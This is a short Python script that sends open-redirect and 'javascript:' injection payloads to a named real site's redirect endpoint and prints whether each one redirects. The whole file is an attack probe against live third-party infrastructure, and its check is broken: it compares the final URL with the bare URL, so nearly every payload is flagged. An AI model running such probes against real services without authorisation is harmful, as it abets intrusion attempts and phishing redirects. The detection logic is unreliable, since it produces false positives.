import requests

# The vulnerable URL
url = "https://tiktok.com/redirect"

# List of potential open redirect payloads
payloads = [
    "https://malicious-website.com",
    "http://evil-site.com",
    "javascript:alert('Hacked')"
]

# Testing the payloads
for payload in payloads:
    params = {"url": payload}
    response = requests.get(url, params=params)
    
    # Check if the response redirects to a potentially dangerous URL
    if response.url != url:
        print(f"Possible open redirect detected: {response.url}")
    else:
        print(f"No open redirect: {payload}")
